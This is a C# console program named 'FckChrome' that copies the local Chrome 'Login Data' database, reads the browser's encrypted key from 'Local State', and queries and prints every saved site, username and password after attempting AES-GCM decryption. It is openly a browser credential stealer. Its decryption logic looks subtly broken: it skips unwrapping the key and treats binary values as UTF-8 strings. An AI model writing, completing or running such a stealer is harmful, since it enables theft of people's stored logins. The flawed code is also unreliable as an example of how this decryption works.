using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using Newtonsoft.Json;
using System.Security.Cryptography;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml.Serialization;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Security;

namespace FckChrome
{
    class Program
    {
        static string user = Environment.UserName;
        static string path = "C:\\Users\\"+user+"\\AppData\\Local\\Google\\Chrome\\User Data";
        static void Main(string[] args)
        {
            File.Delete("file.sqlite");
            banner();
            Console.WriteLine(getPrivateKey(path));
            string dbPath = path + @"\\Default\\Login Data";
            File.Copy(dbPath, "file.sqlite"); //delete then
            using (SQLiteConnection connection = new SQLiteConnection("Data Source=file.sqlite"))
            {
                connection.Open();
                using (SQLiteCommand command = new SQLiteCommand("select origin_url, action_url, username_value, password_value from logins order by date_created", connection))
                {
                    using (SQLiteDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string originUrl = reader.GetString(0);
                            string actionUrl = reader.GetString(1);
                            string username = reader.GetString(2);
                            string password = reader.GetString(3);


                            // Faça algo com os valores retornados
                            Console.WriteLine("Origin URL: " + originUrl);
                            Console.WriteLine("Action URL: " + actionUrl);
                            Console.WriteLine("Username: " + username);
                            Console.WriteLine("Password: " + DecryptPass(getPrivateKey(path), password));
                            Console.WriteLine("-----------------------------------");

                        }
                    }
                }

            }
            Console.ReadKey();

        }
        static void banner()
        {
            Console.WriteLine("    ______     __   ________                            ");
            Console.WriteLine("   / ____/____/ /__/ ____/ /_  _________  ____ ___  ___ ");
            Console.WriteLine(@"  / /_  / ___/ //_/ /   / __ \/ ___/ __ \/ __ `__ \/ _ \");
            Console.WriteLine(" / __/ / /__/ ,< / /___/ / / / /  / /_/ / / / / / /  __/");
            Console.WriteLine(@"/_/    \___/_/|_|\____/_/ /_/_/   \____/_/ /_/ /_/\___/ ");
        }
        static public string getPrivateKey(string path)
        {
            path = path + "\\Local State";
            string json = File.ReadAllText(path);
            dynamic jsonObj = JsonConvert.DeserializeObject(json);
            string EncryptedKey = jsonObj.os_crypt.encrypted_key;
            var decryptedKey = System.Convert.FromBase64String(EncryptedKey);
            string key = Encoding.UTF8.GetString(decryptedKey).Substring(5);
            return key;
        }
        static private string DecryptPass(string key, string pass)
        {
         
                string initializationVector = pass.Substring(3, 12);
                string encryptedPassword = pass.Substring(15, pass.Length - 31);

                byte[] secretKey = Encoding.UTF8.GetBytes(key);
                byte[] iv = Encoding.UTF8.GetBytes(initializationVector);
                byte[] encryptedBytes = Encoding.UTF8.GetBytes(encryptedPassword);

                IBufferedCipher cipher = CipherUtilities.GetCipher("AES/GCM/NoPadding");
                KeyParameter keyParam = new KeyParameter(secretKey);
                ParametersWithIV parameters = new ParametersWithIV(keyParam, iv);
                cipher.Init(false, parameters);

                byte[] decryptedBytes = cipher.DoFinal(encryptedBytes);

                string decryptedPass = Encoding.UTF8.GetString(decryptedBytes);
                return decryptedPass;
            

        }


    }
}
